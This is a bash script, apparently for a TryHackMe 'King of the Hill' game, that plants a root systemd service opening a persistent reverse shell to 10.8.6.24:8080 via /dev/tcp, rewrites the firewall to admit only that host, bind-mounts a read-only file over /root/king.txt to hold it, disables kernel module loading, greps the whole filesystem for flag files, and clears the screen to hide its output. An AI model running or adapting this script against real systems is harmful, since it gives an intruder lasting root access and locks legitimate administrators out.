#!/bin/bash

lhost="10.8.6.24"
lport="8080"
username="Vit8816"

SystemdPersistence() {
    cat <<EOF > /etc/systemd/system/persistence.service
[Unit]
Description= Systemd Persistence

[Service]
User=root
Group=root
WorkingDirectory=/root
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF
}

flags() {
    echo "Finding flags..."
    find / -name "*flag.txt" -o -name ".flag*" -exec cat {} \; 2>/dev/null > temp_flags.txt
    find / -name ".flag" -o -name "flag" -exec cat {} \; 2>/dev/null >> temp_flags.txt
    find / -name "user.txt" -exec cat {} \; 2>/dev/null >> temp_flags.txt
    grep -r "THM{" / >> temp_flags.txt 2>/dev/null

    if [[ -s "temp_flags.txt" ]]; then
        echo "All flags Found"
    else
        echo "No flags found"
    fi

    echo "Here are your flags."
    cat temp_flags.txt
}

EnablePersistence() {
    systemctl enable persistence.service
    systemctl start persistence
}

ufw_commands="sudo ufw allow from $lhost && sudo ufw deny from all && sudo ufw enable && sudo ufw reload"
kinger="sudo lessecho $username > /root/king.txt & sudo dd if=/dev/zero of=/dev/shm/root_f bs=1000 count=100 & sudo mkfs.ext3 /dev/shm/root_f & sudo mkdir /dev/shm/sqashfs & sudo mount -o loop /dev/shm/root_f /dev/shm/sqashfs/ & sudo chmod -R 777 /dev/shm/sqashfs/ & sudo lessecho $username > /dev/shm/sqashfs/king.txt & sudo mount -o ro,remount /dev/shm/sqashfs & sudo mount -o bind /dev/shm/sqashfs/king.txt /root/king.txt & sudo rm -rf /dev/shm/root_f"

eval "$ufw_commands"
eval "$kinger"
cd / && chattr -ia root
sudo sysctl -w kernel.modules_disabled=1

message="[+] setup completed! [+]"
echo "$message"
clear

echo "[+] Activating the service [+]"
echo ""
clear

success="[+] Success! [+]"
echo "$success"
clear

SystemdPersistence
EnablePersistence
flags
